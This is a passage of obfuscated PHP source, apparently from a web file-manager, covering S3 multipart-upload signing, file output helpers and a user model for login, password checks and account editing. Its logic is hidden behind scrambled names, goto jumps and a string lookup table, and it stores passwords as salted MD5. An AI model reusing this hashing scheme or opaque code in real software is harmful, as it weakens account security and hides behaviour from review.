str_replace($A‹Ç∏À‡≈‰[233], $A‹Ç∏À‡≈‰[33], $AåÃ≤¶üœº[$A‹Ç∏À‡≈‰[168]]); $Cîñ‹ˆƒ«± = $this->client->listParts($this->bucket, $aå´àã€˘¯, $d–ª—æ‰◊Ñ); goto dı∑ﬁÉñíÓ; c—§ø•ç£õ: $d›≈π“”Ÿ™ .= $A‹Ç∏À‡≈‰[1328]; $fÒÎóŸøï• = array(); $C¡Ãéì®≠æ = explode($A‹Ç∏À‡≈‰[177], $this->getHost()); goto b Ôﬁ¥ﬂ›°; dı∑ﬁÉñíÓ: if (!$Cîñ‹ˆƒ«±) { return !1; } $d›≈π“”Ÿ™ = $A‹Ç∏À‡≈‰[1325]; foreach ($Cîñ‹ˆƒ«± as $BäÈ˘ŸØËÇ) { $d›≈π“”Ÿ™ .= $A‹Ç∏À‡≈‰[1326] . "\x3c\120\x61\x72\x74\x4e\165\x6d\142\145\x72\76{$BäÈ˘ŸØËÇ[$A‹Ç∏À‡≈‰[1281]]}\74\57\120\141\x72\164\116\165\x6d\x62\145\162\x3e\12" . "\x3c\105\124\x61\147\76{$BäÈ˘ŸØËÇ[$A‹Ç∏À‡≈‰[1282]]}\x3c\57\105\124\x61\x67\x3e\12" . $A‹Ç∏À‡≈‰[1327]; } goto c—§ø•ç£õ; e€ÙîÎÌûæ: $Bê∂ÜÒí≠å = $this->client->__getSignatureV4($fÒÎóŸøï•, $EÁ…∫ì—£∂, $B·¬‚Ï‚ûõ, $dÔ„†äıŒµ, $d›≈π“”Ÿ™); return array($A‹Ç∏À‡≈‰[232] => $Bê∂ÜÒí≠å[$A‹Ç∏À‡≈‰[232]], $A‹Ç∏À‡≈‰[222] => $Bê∂ÜÒí≠å[$A‹Ç∏À‡≈‰[1324]], $A‹Ç∏À‡≈‰[234] => $Cîñ‹ˆƒ«±, $A‹Ç∏À‡≈‰[1321] => $Bê∂ÜÒí≠å[$A‹Ç∏À‡≈‰[1321]]); goto Eòª˘åÍ≈Ö; b Ôﬁ¥ﬂ›°: $EÁ…∫ì—£∂ = array($A‹Ç∏À‡≈‰[1322] => $C¡Ãéì®≠æ[1], $A‹Ç∏À‡≈‰[211] => $A‹Ç∏À‡≈‰[119], $A‹Ç∏À‡≈‰[1236] => strlen($d›≈π“”Ÿ™)); $B·¬‚Ï‚ûõ = $A‹Ç∏À‡≈‰[224]; $dÔ„†äıŒµ = $A‹Ç∏À‡≈‰[8] . $this->pathEncode($aå´àã€˘¯) . $AåÃ≤¶üœº[$A‹Ç∏À‡≈‰[168]]; goto e€ÙîÎÌûæ; Eòª˘åÍ≈Ö: } public function link($AÖ¯¡ˆñÃ«, $aÒã’ºÍß‹ = array()) { return parent::link($AÖ¯¡ˆñÃ«, $aÒã’ºÍß‹); } public function fileOut($AòõäÑçÚø, $Dè¯‹„•±Û = false, $Aæ™Òﬁì„ï = false, $A¬ç«∞∂€¶ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ú∫][1329])) { return parent::fileOutServer($AòõäÑçÚø, $Dè¯‹„•±Û, $Aæ™Òﬁì„ï, $A¬ç«∞∂€¶); } parent::fileOut($AòõäÑçÚø, $Dè¯‹„•±Û, $Aæ™Òﬁì„ï, $A¬ç«∞∂€¶); } public function fileOutImage($f◊Ù£÷≥ïö, $Bº¬¢†≥∆È = 250) { if (strstr($this->endpoint, $_SERVER[ú∫][1329])) { return parent::fileOutImageServer($f◊Ù£÷≥ïö, $Bº¬¢†≥∆È); } parent::fileOutImage($f◊Ù£÷≥ïö, $Bº¬¢†≥∆È); } public function fileOutLink($eáˆ∫Î∂Ùà) { $Aâ±ˆë•¥≠ =& $_SERVER[ú∫]; if (substr($eáˆ∫Î∂Ùà, 0, 7) == $Aâ±ˆë•¥≠[1204]) { $eáˆ∫Î∂Ùà = $Aâ±ˆë•¥≠[1205] . substr($eáˆ∫Î∂Ùà, 7); } header($Aâ±ˆë•¥≠[159] . $eáˆ∫Î∂Ùà); die; } public function getHost() { $Díìı”ê„È =& $_SERVER[ú∫]; $aíŒﬂ…®Çö = str_rtrim(parent::getHost(), $Díìı”ê„È[8] . $this->bucket); $aíŒﬂ…®Çö = explode($Díìı”ê„È[177], $aíŒﬂ…®Çö); return $aíŒﬂ…®Çö[0] . $Díìı”ê„È[177] . $this->bucket . $Díìı”ê„È[95] . $aíŒﬂ…®Çö[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($däÏ´ıﬂ’‚, $c÷Éå≤¡Ûƒ = 0) { parent::__construct(); $this->source = $däÏ´ıﬂ’‚; $this->sourceSize = $c÷Éå≤¡Ûƒ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($a±Ù≤ø……æ = false) { return $this->sourceSize; } public function getContent($d»ä°Æêãé = false) { return $this->fileSubstr($d»ä°Æêãé, 0, $this->sourceSize); } public function fileSubstr($AÃíåîñ≠∆ = false, $d»Ç≤ÓÍ≈π = 0, $F¯ÁóÇ‰µÕ = 0) { if (!$F¯ÁóÇ‰µÕ) { $F¯ÁóÇ‰µÕ = $this->sourceSize; } $fìò»Ê˜Öí = $this->sourceSize - $d»Ç≤ÓÍ≈π; if ($F¯ÁóÇ‰µÕ >= $fìò»Ê˜Öí) { $F¯ÁóÇ‰µÕ = $fìò»Ê˜Öí; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $d»Ç≤ÓÍ≈π, $F¯ÁóÇ‰µÕ); } if ($this->sourceType == self::TYPE_FILE) { if ($F¯ÁóÇ‰µÕ <= 0) { return $_SERVER[ú∫][33]; } $dΩˆøÓî•è = ftell($this->source); fseek_64($this->source, $dΩˆøÓî•è + $d»Ç≤ÓÍ≈π); $f‰«≤≤⁄–Â = @fread($this->source, $F¯ÁóÇ‰µÕ); fseek_64($this->source, $dΩˆøÓî•è); return $f‰«≤≤⁄–Â; } } public function hashMd5($d˘¡Ñƒ›–ã = false) { return md5($this->getContent()); } public static function hash($BÉ≈ë◊‡≤Ò, $BÃÿÕñÇåë = 0) { $B÷Ø…öÙË÷ = new PathDriverStream($BÉ≈ë◊‡≤Ò, $BÃÿÕñÇåë); return $B÷Ø…öÙË÷->hashSimple($BÉ≈ë◊‡≤Ò); } public static function md5($A©⁄ŸÛ»™ß, $B˘Ò≈Õ≥¿ó = 0) { $bΩ≤¯¶óŒÎ = new PathDriverStream($A©⁄ŸÛ»™ß, $B˘Ò≈Õ≥¿ó); return $bΩ≤¯¶óŒÎ->hashMd5($A©⁄ŸÛ»™ß); } } goto eò√Á™ÖÖı; aìöà°…è: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\155\145" => "\165\x73\145\x72\137\155\x65\x74\141", "\155\x65\x74\141\x46\151\145\x6c\x64" => "\165\x73\x65\x72\111\104"); protected $simpleField = "\x75\163\145\162\x49\x44\x2c\156\x69\x63\153\116\141\x6d\x65\x2c\x6e\x61\x6d\x65\54\141\166\x61\164\141\x72\x2c\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($DÂˆêéõäÒ) { $Dﬂ∏Ê∞—¶è =& $_SERVER[ú∫]; $aª∂…ˆû·Õ = $Dﬂ∏Ê∞—¶è[2116]; return array($Dﬂ∏Ê∞—¶è[1762] => array($DÂˆêéõäÒ[0], $aª∂…ˆû·Õ), $Dﬂ∏Ê∞—¶è[1764] => array($DÂˆêéõäÒ[0], $aª∂…ˆû·Õ), $Dﬂ∏Ê∞—¶è[2117] => array($DÂˆêéõäÒ[0], $aª∂…ˆû·Õ)); } protected function getInfo($CÕ–âìíñ¯, $C∞ê§ÛÃÒŒ = false) { $C¥øº§ë…í = $this->getInfoSimple($CÕ–âìíñ¯); if (!is_array($C¥øº§ë…í)) { return array(); } if ($C∞ê§ÛÃÒŒ) { return $this->_getInfoApply($C¥øº§ë…í); } return $this->cacheFunctionGet($_SERVER[ú∫][1771], $CÕ–âìíñ¯); } protected function getInfoFull($Aı¶¢ÿ≈äó, $c£∆éè˘È = false) { $dîçÉÒã†® = $this->getInfoSimple($Aı¶¢ÿ≈äó); if (!is_array($dîçÉÒã†®)) { return array(); } if ($c£∆éè˘È) { return $this->_getInfoApply($dîçÉÒã†®, !0); return $this->_getInfoApply($dîçÉÒã†®, !0); } return $this->cacheFunctionGet($_SERVER[ú∫][2118], $Aı¶¢ÿ≈äó); } private function _getInfoApply($F¶ÿÿêåóÉ, $Añﬁ÷®åœ§ = false) { goto c∫ØßõÑ∑“; Cì©¿öã•û: $F¶ÿÿêåóÉ[$f‰ﬁΩ∑äØÜ[85]][$f‰ﬁΩ∑äØÜ[1952]] = isset($c¢Áí·çΩƒ[$f‰ﬁΩ∑äØÜ[1953]]) ? $c¢Áí·çΩƒ[$f‰ﬁΩ∑äØÜ[1953]] : null; if ($Añﬁ÷®åœ§) { $F¶ÿÿêåóÉ[$f‰ﬁΩ∑äØÜ[445]] = $this->metaGet($F¶ÿÿêåóÉ[$f‰ﬁΩ∑äØÜ[1528]]); } return $F¶ÿÿêåóÉ; goto bîˆ¿ä¡∑±; c∫ØßõÑ∑“: $f‰ﬁΩ∑äØÜ =& $_SERVER[ú∫]; if (!$F¶ÿÿêåóÉ) { return $F¶ÿÿêåóÉ; } $D©∆Ú„∆…≠ = md5($f‰ﬁΩ∑äØÜ[2119] . $F¶ÿÿêåóÉ[$f‰ﬁΩ∑äØÜ[849]] . $f‰ﬁΩ∑äØÜ[2120] . $F¶ÿÿêåóÉ[$f‰ﬁΩ∑äØÜ[28]]); goto BìÑäêÜ…∞; BìÑäêÜ…∞: $F¶ÿÿêåóÉ = $this->_listDataApplyItem($F¶ÿÿêåóÉ); $c¢Áí·çΩƒ = Model($f‰ﬁΩ∑äØÜ[1206])->metaGet($F¶ÿÿêåóÉ[$f‰ﬁΩ∑äØÜ[85]][$f‰ﬁΩ∑äØÜ[395]]); $F¶ÿÿêåóÉ[$f‰ﬁΩ∑äØÜ[2121]] = $D©∆Ú„∆…≠; goto Cì©¿öã•û; bîˆ¿ä¡∑±: } protected function getInfoSimple($a∆é—õ¥àÙ, $DπÚÃáÑŸí = false) { $Dèƒ¡àùæë =& $_SERVER[ú∫]; if (!$a∆é—õ¥àÙ) { return array(); } if ($DπÚÃáÑŸí) { $eÉÕáƒ˜ÉÃ = $this->where(array($Dèƒ¡àùæë[1528] => intval($a∆é—õ¥àÙ)))->find(); if (!is_array($eÉÕáƒ˜ÉÃ)) { return array(); } $eÉÕáƒ˜ÉÃ[$Dèƒ¡àùæë[2122]] = Action($Dèƒ¡àùæë[2123])->parseUrl($eÉÕáƒ˜ÉÃ[$Dèƒ¡àùæë[2122]]); return $eÉÕáƒ˜ÉÃ; } return $this->cacheFunctionGet($Dèƒ¡àùæë[1765], $a∆é—õ¥àÙ); } protected function getInfoSimpleOuter($e¿˘ŸÖ˜∫û) { goto fÆÇ©∑Ê¯; bÁå™µÖ¯¢: return $B≥¡Çˆ—É´; goto f≤õ∂¬·æà; fÆÇ©∑Ê¯: $A†É∑∂€‡Û =& $_SERVER[ú∫]; if (!$e¿˘ŸÖ˜∫û || $e¿˘ŸÖ˜∫û == 0) { return array($A†É∑∂€‡Û[1528] => $A†É∑∂€‡Û[191], $A†É∑∂€‡Û[28] => $A†É∑∂€‡Û[160] . LNG($A†É∑∂€‡Û[2124]) . $A†É∑∂€‡Û[504], $A†É∑∂€‡Û[2122] => STATIC_PATH . $A†É∑∂€‡Û[2125]); } $c¨◊¢÷âòﬁ = $this->cacheFunctionGet($A†É∑∂€‡Û[1765], $e¿˘ŸÖ˜∫û); goto e›ÔÏÕ¥âã; e›ÔÏÕ¥âã: $B≥¡Çˆ—É´ = array_field_key($c¨◊¢÷âòﬁ, explode($A†É∑∂€‡Û[47], $this->simpleField)); if (!$B≥¡Çˆ—É´) { return array($A†É∑∂€‡Û[1528] => $A†É∑∂€‡Û[1085], $A†É∑∂€‡Û[28] => $A†É∑∂€‡Û[160] . LNG($A†É∑∂€‡Û[2126]) . $A†É∑∂€‡Û[504], $A†É∑∂€‡Û[2122] => STATIC_PATH . $A†É∑∂€‡Û[2127]); } $B≥¡Çˆ—É´[$A†É∑∂€‡Û[2122]] = Action($A†É∑∂€‡Û[2123])->parseUrl($B≥¡Çˆ—É´[$A†É∑∂€‡Û[2122]]); goto bÁå™µÖ¯¢; f≤õ∂¬·æà: } protected function groupUser($EäáÊ«™úÊ) { } public static function errorLang($a…ëú˘«í) { $eéÒπ”˜Œ– =& $_SERVER[ú∫]; $C«»ààØﬁ¢ = array(self::ERROR_USER_NOT_EXISTS => $eéÒπ”˜Œ–[2128], self::ERROR_USER_PASSWORD_ERROR => $eéÒπ”˜Œ–[2129], self::ERROR_USER_EXIST_NAME => $eéÒπ”˜Œ–[2130], self::ERROR_USER_EXIST_PHONE => $eéÒπ”˜Œ–[2131], self::ERROR_USER_EXIST_EMAIL => $eéÒπ”˜Œ–[2132], self::ERROR_USER_LOGIN_LOCK => $eéÒπ”˜Œ–[2133], self::ERROR_IP_NOT_ALLOW => $eéÒπ”˜Œ–[2134], self::ERROR_USER_EXIST_NICKNAME => $eéÒπ”˜Œ–[2135]); return LNG($C«»ààØﬁ¢[$a…ëú˘«í]); } public function getInfoByMeta($D¡ÖÛÇˆÖà, $FäŒ·“Øµ±) { $e¢ÚÎ˘á«Ã =& $_SERVER[ú∫]; $aìª•”ÊíÂ = Model($e¢ÚÎ˘á«Ã[2136])->where(array($e¢ÚÎ˘á«Ã[93] => $D¡ÖÛÇˆÖà, $e¢ÚÎ˘á«Ã[372] => $FäŒ·“Øµ±))->find(); if ($aìª•”ÊíÂ) { return $this->getInfo($aìª•”ÊíÂ[$e¢ÚÎ˘á«Ã[1528]]); } return !1; } public function userLoginCheck($aÈÇøâÊÌÚ, $BÏæƒß∂Ú) { $bﬂ∏êî„Ì€ =& $_SERVER[ú∫]; $Fü…¯ÁóÉØ = $this->userLoginFind($aÈÇøâÊÌÚ); if (!$Fü…¯ÁóÉØ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Fü…¯ÁóÉØ[$bﬂ∏êî„Ì€[1528]], $BÏæƒß∂Ú)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Fü…¯ÁóÉØ[$bﬂ∏êî„Ì€[1528]]); } public function userLoginFind($FÃóœ¢Ç‰‡) { $béåÓ≈’ƒê =& $_SERVER[ú∫]; $cóç√ã·„” = array($béåÓ≈’ƒê[28] => $FÃóœ¢Ç‰‡, $béåÓ≈’ƒê[1956] => $FÃóœ¢Ç‰‡, $béåÓ≈’ƒê[303] => $FÃóœ¢Ç‰‡, $béåÓ≈’ƒê[2137] => $FÃóœ¢Ç‰‡, $béåÓ≈’ƒê[957] => $béåÓ≈’ƒê[959]); if ($this->nickNameRpt()) { unset($cóç√ã·„”[$béåÓ≈’ƒê[1956]]); } return $this->where($cóç√ã·„”)->find(); } public function clearCache($Aà∏¿Ãâ∏≠) { $Eâƒôﬁ…€ˆ =& $_SERVER[ú∫]; $this->cacheFunctionClear($Eâƒôﬁ…€ˆ[1771], $Aà∏¿Ãâ∏≠); $this->cacheFunctionClear($Eâƒôﬁ…€ˆ[1765], $Aà∏¿Ãâ∏≠); $this->cacheFunctionClear($Eâƒôﬁ…€ˆ[2118], $Aà∏¿Ãâ∏≠); } public function userPasswordCheck($b≤ä±‘ÿíÍ, $e‡’∞‰±ë) { $C£Ê‰çáçÑ =& $_SERVER[ú∫]; $eÉŒ‚Ëõ¡ï = $this->where(array($C£Ê‰çáçÑ[1528] => intval($b≤ä±‘ÿíÍ)))->find(); $Aì¥îã˜Û¬ = $this->metaGet($b≤ä±‘ÿíÍ); $C´ö–¿¨Í¿ = isset($Aì¥îã˜Û¬[$C£Ê‰çáçÑ[2138]]) ? $Aì¥îã˜Û¬[$C£Ê‰çáçÑ[2138]] : $C£Ê‰çáçÑ[33]; if (md5($C´ö–¿¨Í¿ . trim($e‡’∞‰±ë)) !== $eÉŒ‚Ëõ¡ï[$C£Ê‰çáçÑ[849]]) { return !1; } return !0; } public function userAdd($cõÌßùµæÜ) { goto d≈•Â—Ì“´; d≈•Â—Ì“´: $cΩÿ∆àéõÒ =& $_SERVER[ú∫]; $F∏’ı´”ª‘ = array($cΩÿ∆àéõÒ[413] => $cõÌßùµæÜ[$cΩÿ∆àéõÒ[28]], $cΩÿ∆àéõÒ[2139] => $cõÌßùµæÜ[$cΩÿ∆àéõÒ[1411]], $cΩÿ∆àéõÒ[2140] => isset($cõÌßùµæÜ[$cΩÿ∆àéõÒ[303]]) ? $cõÌßùµæÜ[$cΩÿ∆àéõÒ[303]] : $cΩÿ∆àéõÒ[33], $cΩÿ∆àéõÒ[2141] => isset($cõÌßùµæÜ[$cΩÿ∆àéõÒ[2137]]) ? $cõÌßùµæÜ[$cΩÿ∆àéõÒ[2137]] : $cΩÿ∆àéõÒ[33], $cΩÿ∆àéõÒ[2142] => isset($cõÌßùµæÜ[$cΩÿ∆àéõÒ[1956]]) ? $cõÌßùµæÜ[$cΩÿ∆àéõÒ[1956]] : $cõÌßùµæÜ[$cΩÿ∆àéõÒ[28]], $cΩÿ∆àéõÒ[2143] => isset($cõÌßùµæÜ[$cΩÿ∆àéõÒ[2122]]) ? $cõÌßùµæÜ[$cΩÿ∆àéõÒ[2122]] : $cΩÿ∆àéõÒ[33], $cΩÿ∆àéõÒ[2144] => isset($cõÌßùµæÜ[$cΩÿ∆àéõÒ[2145]]) ? $cõÌßùµæÜ[$cΩÿ∆àéõÒ[2145]] : 1, $cΩÿ∆àéõÒ[2146] => $cõÌßùµæÜ[$cΩÿ∆àéõÒ[849]], $cΩÿ∆àéõÒ[1766] => isset($cõÌßùµæÜ[$cΩÿ∆àéõÒ[1676]]) ? $cõÌßùµæÜ[$cΩÿ∆àéõÒ[1676]] : 1024 * 1024 * 20, $cΩÿ∆àéõÒ[1767] => 0, $cΩÿ∆àéõÒ[2147] => 0, $cΩÿ∆àéõÒ[1810] => isset($cõÌßùµæÜ[$cΩÿ∆àéõÒ[710]]) ? $cõÌßùµæÜ[$cΩÿ∆àéõÒ[710]] : 1); if (!empty($cõÌßùµæÜ[$cΩÿ∆àéõÒ[1528]])) { $F∏’ı´”ª‘[$cΩÿ∆àéõÒ[1528]] = $cõÌßùµæÜ[$cΩÿ∆àéõÒ[1528]]; } goto aËÈﬁ’«Ñï; aËÈﬁ’«Ñï: $bŸØºÌúÙ„ = $this->_checkExist($cõÌßùµæÜ); if ($bŸØºÌúÙ„ !== !0) { return $bŸØºÌúÙ„; } $bõ∫ô˜Ω◊Î = $this->add($F∏’ı´”ª‘); goto fÛÀ–õåùù; fÛÀ–õåùù: $B≥∞áëÙﬂù = array($cΩÿ∆àéõÒ[2146] => $F∏’ı´”ª‘[$cΩÿ∆àéõÒ[849]], $cΩÿ∆àéõÒ[2142] => $F∏’ı´”ª‘[$cΩÿ∆àéõÒ[1956]]); $this->userEdit($bõ∫ô˜Ω◊Î, $B≥∞áëÙﬂù); Model($cΩÿ∆àéõÒ[1206])->userRootAdd($bõ∫ô˜Ω◊Î); goto Bﬂƒ…ÙÎ„; Bﬂƒ…ÙÎ„: return $bõ∫ô˜Ω◊Î; goto Bπ±‚ÿ“áË; Bπ±‚ÿ“áË: } protected function userEditTest($eû÷‰∆´á¯, $dâ≠Ç¥ú¶∑) { return $this->call($_SERVER[ú∫][2148], $eû÷‰∆´á¯, $dâ≠Ç¥ú¶∑); } protected function userEdit($C…°õ…äÿ, $D‚€éèˆÊ–) { goto b‚Í ∑Ïã–; Dï¶∂°äÔÛ: $A⁄Â…ñ…„È = $this->_checkExist($D‚€éèˆÊ–, $C…°õ…äÿ); if ($A⁄Â…ñ…„È !== !0) { return $A⁄Â…ñ…„È; } if (isset($D‚€éèˆÊ–[$D´ã¶Ô¬‚Í[849]]) && trim($D‚€éèˆÊ–[$D´ã¶Ô¬‚Í[849]]) != $D´ã¶Ô¬‚Í[33]) { $fé‚ÑéôœÏ = $this->metaGet($C…°õ…äÿ); if (empty($fé‚ÑéôœÏ[$D´ã¶Ô¬‚Í[2138]])) { $fé‚ÑéôœÏ[$D´ã¶Ô¬‚Í[2138]] = rand_string(10); Model($D´ã¶Ô¬‚Í[502])->metaSet($C…°õ…äÿ, $D´ã¶Ô¬‚Í[2138], $fé‚ÑéôœÏ[$D´ã¶Ô¬‚Í[2138]]); } $D‚€éèˆÊ–[$D´ã¶Ô¬‚Í[849]] = md5($fé‚ÑéôœÏ[$D´ã¶Ô¬‚Í[2138]] . trim($D‚€éèˆÊ–[$D´ã¶Ô¬‚Í[849]])); } else { unset($D‚€éèˆÊ–[$D´ã¶Ô¬‚Í[849]]); } goto f≈Æ≈¨õ¬ß; b‚Í ∑Ïã–: $D´ã¶Ô¬‚Í =& $_SERVER[ú∫]; $Dü–…º⁄÷ì = $this->getInfoSimple($C…°õ…äÿ); if (!$Dü–…º⁄÷ì) { return !1; } goto Dï¶∂°äÔÛ; A∆ÑæèÍ∑‚: return !0; goto C±áê ïìı; f≈Æ≈¨õ¬ß: $this->where(array($D´ã¶Ô¬‚Í[1520] => $C…°õ…äÿ))->save($D‚€éèˆÊ–); if (isset($D‚€éèˆÊ–[$D´ã¶Ô¬‚Í[1956]])) { $this->setNamePinyin($C…°õ…äÿ, $D‚€éèˆÊ–[$D´ã¶Ô¬‚Í[1956]]); } $this->clearCache($C…°õ…äÿ); goto A∆ÑæèÍ∑‚; C±áê ïìı: } public function setNamePinyin($D∆Éﬁó™ïÖ, $DÇ†ô’‡ü‡ = false) { $DÊÇ≤¯¶êÖ =& $_SERVER[ú∫]; if (!$DÇ†ô’‡ü‡) { $d’Ø…ı¯±• = $this->getInfoSimple($D∆Éﬁó™ïÖ); $DÇ†ô’‡ü‡ = $d’Ø…ı¯±•[$DÊÇ≤¯¶êÖ[1956]] ? $d’Ø…ı¯±•[$DÊÇ≤¯¶êÖ[1956]] : $d’Ø…ı¯±•[$DÊÇ≤¯¶êÖ[28]]; } $C–É‚ÎœÆ• = Model($DÊÇ≤¯¶êÖ[506]); if (!Input::check($DÇ†ô’‡ü‡, $DÊÇ≤¯¶êÖ[556])) { return $C–É‚ÎœÆ•->metaSet($D∆Éﬁó™ïÖ, array($DÊÇ≤¯¶êÖ[444] => $DÊÇ≤¯¶êÖ[33], $DÊÇ≤¯¶êÖ[443] => $DÊÇ≤¯¶êÖ[33])); } return $C–É‚ÎœÆ•->metaSet($D∆Éﬁó™ïÖ, array($DÊÇ≤¯¶êÖ[444] => str_replace($DÊÇ≤¯¶êÖ[50], $DÊÇ≤¯¶êÖ[33], Pinyin::encode($DÇ†ô’‡ü‡)), $DÊÇ≤¯¶êÖ[443] => Pinyin::encode($DÇ†ô’‡ü‡, $DÊÇ≤¯¶êÖ[557]))); } private function nickNameRpt() { $eÂ°ÑÖµÍÃ =& $_SERVER[ú∫]; $AÏ∂˜∆¥èÜ = Model($eÂ°ÑÖµÍÃ[730])->get($eÂ°ÑÖµÍÃ[2149]); $f¥ÜŒÂ´ãô = $GLOBALS[$eÂ°ÑÖµÍÃ[6]][$eÂ°ÑÖµÍÃ[378]][$eÂ°ÑÖµÍÃ[2149]]; $aÈΩ∞É©ë = !is_null($AÏ∂˜∆¥èÜ) ? $AÏ∂˜∆¥èÜ : $f¥ÜŒÂ´ãô; return !!$aÈΩ∞É©ë; } private function _checkExist($CÏë∑Øï÷Á, $b¢ª¿±Ñ’Ñ = false) { $D∏ä·÷ãπå =& $_SERVER[ú∫]; $Döô∏„öÕ÷ = array($D∏ä·÷ãπå[28] => UserModel::ERROR_USER_EXIST_NAME, $D∏ä·÷ãπå[1956] => UserModel::ERROR_USER_EXIST_NICKNAME, $D∏ä·÷ãπå[303] => UserModel::ERROR_USER_EXIST_EMAIL, $D∏ä·÷ãπå[2137] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Döô∏„öÕ÷[$D∏ä·÷ãπå[1956]]); } $fπÒ¬íìù± = $b¢ª¿±Ñ’Ñ ? array($D∏ä·÷ãπå[1528] => array($D∏ä·÷ãπå[2150], $b¢ª¿±Ñ’Ñ)) : array(); foreach ($Döô∏„öÕ÷ as $f◊ÕÀÑê≠é => $B‡‘©¨Ñçﬁ) { $fØ¿é›ÊãÒ = array(); foreach ($Döô∏„öÕ÷ as $A£ﬁ∞”ò≠— => $Aòá◊“âÌô) { if (isset($CÏë∑Øï÷Á[$A£ﬁ∞”ò≠—]) && $CÏë∑Øï÷Á[$A£ﬁ∞”ò≠—]) { $fØ¿é›ÊãÒ[] = $CÏë∑Øï÷Á[$A£ﬁ∞”ò≠—]; } } if (!$fØ¿é›ÊãÒ) { continue; } $aµ⁄êûõÏ‰ = array_merge(array($f◊ÕÀÑê≠é => array($D∏ä·÷ãπå[7], $fØ¿é›ÊãÒ)), $fπÒ¬íìù±); $a∆ñ£∞≈ûÎ = $this->where($aµ⁄êûõÏ‰)->find(); if ($a∆ñ£∞≈ûÎ) { return $B‡‘©¨Ñçﬁ; } } return !0; } public function userListInfo($AÜ’ê¶É˘ä) { $AÙ¿µÏÉŸı =& $_SERVER[ú∫]; $a÷≥ÉÓîΩ‡ = array(); $AÜ’ê¶É˘ä = is_array($AÜ’ê¶É˘ä) ? array_unique($AÜ’ê¶É˘ä) : array(); if (!$AÜ’ê¶É˘ä) { return $a÷≥ÉÓîΩ‡; } if (count($AÜ’ê¶É˘ä) < 20) { foreach ($AÜ’ê¶É˘ä as $B≠ßçƒú§Ø) { $a÷≥ÉÓîΩ‡[$B≠ßçƒú§Ø . $AÙ¿µÏÉŸı[33]] = $this->getInfoSimpleOuter($B≠ßçƒú§Ø); } } else { $CèµÕ‹øÓä = array($AÙ¿µÏÉŸı[1520] => array($AÙ¿µÏÉŸı[411], $AÜ’ê¶É˘ä)); if (count($AÜ’ê¶É˘ä) == 1) { $CèµÕ‹øÓä = array($AÙ¿µÏÉŸı[1520] => $AÜ’ê¶É˘ä[0]); } $aÃÏÀÛ»ÕÒ = Model($AÙ¿µÏÉŸı[502])->field($this->simpleField)->where($CèµÕ‹øÓä)->select(); $aÃÏÀÛ»ÕÒ = array_to_keyvalue($aÃÏÀÛ»ÕÒ, $AÙ¿µÏÉŸı[1528]); foreach ($AÜ’ê¶É˘ä as $B≠ßçƒú§Ø) { $Aü≈õ¯≠–Ü = $aÃÏÀÛ»ÕÒ[$B≠ßçƒú§Ø]; if (!$Aü≈õ¯≠–Ü) { $a÷≥ÉÓîΩ‡[$B≠ßçƒú§Ø . $AÙ¿µÏÉŸı[33]] = $this->getInfoSimpleOuter($B≠ßçƒú§Ø); continue; } $Aü≈õ¯≠–Ü[$AÙ¿µÏÉŸı[2122]] = Action($AÙ¿µÏÉŸı[2123])->parseUrl($Aü≈õ¯≠–Ü[$AÙ¿µÏÉŸı[2122]]); $a÷≥ÉÓîΩ‡[$B≠ßçƒú§Ø . $AÙ¿µÏÉŸı[33]] = $Aü≈õ¯≠–Ü; } } return $a÷≥ÉÓîΩ‡; } protected function userStatus($bı≤‡Ë‰øò, $Aä≥ﬁòÿ¢Ÿ) { $A‰Û …‰ªı = $this->getInfoSimple($bı≤‡Ë‰øò); if (!$A‰Û …‰ªı) { return !1; } $dÏå©–˜ì = array($_SERVER[ú∫][710] => $Aä≥ﬁòÿ¢Ÿ); return $this->userEdit($bı≤‡Ë‰øò, $dÏå©–˜ì); } protected function userRemove($B⁄çÌÈêÀƒ) { goto AŒâøà¯ı; f¶©’ÉÎ†Æ: Model($bﬂñ’Ü„ÿá[1973])->removeUserAll($B⁄çÌÈêÀƒ); Model($bﬂñ’Ü„ÿá[790])->userRootRemove($B⁄çÌÈêÀƒ); return $this->where($D„Ãõ∑ﬁ §)->delete(); goto bëüß‘ÉÉ•; AŒâøà¯ı: $bﬂñ’Ü„ÿá =& $_SERVER[ú∫]; $Aä√Õà¯´∞ = $this->getInfoSimple($B⁄çÌÈêÀƒ); if (!$Aä√Õà¯´∞) { return !1; } goto C¥Îº‰Á‘Æ; dÖ°ﬂ âÂ—: Model($bﬂñ’Ü„ÿá[1773])->where($D„Ãõ∑ﬁ §)->delete(); Model($bﬂñ’Ü„ÿá[2136])->where($D„Ãõ∑ﬁ §)->delete(); Model($bﬂñ’Ü„ÿá[2152])->where($D„Ãõ∑ﬁ §)->delete(); goto f¶©’ÉÎ†Æ; C¥Îº‰Á‘Æ: $D„Ãõ∑ﬁ § = array($bﬂñ’Ü„ÿá[1520] => $B⁄çÌÈêÀƒ); Model($bﬂñ’Ü„ÿá[563])->where($D„Ãõ∑ﬁ §)->delete(); Model($bﬂñ’Ü„ÿá[2151])->where($D„Ãõ∑ﬁ §)->delete(); goto dÖ°ﬂ âÂ—; bëüß‘ÉÉ•: } protected function userGroupSet($bΩçÒ”ãπ©, $FÎ”°ÁÏÇÀ, $aƒí‡≥ÜŒπ = array()) { goto Bœ™ÿ¿«Éâ; D®¨çµﬂÃ∑: return $A—„ÖµË¥¢->addAll($Bé ˘ﬁãüá, array(), !0); goto D˜ô÷ìÁÈô; fÊÃÒÀÖ® : if (!$eâÿ∏⁄œ≈Ÿ || !is_array($FÎ”°ÁÏÇÀ)) { return !1; } $A—„ÖµË¥¢ = 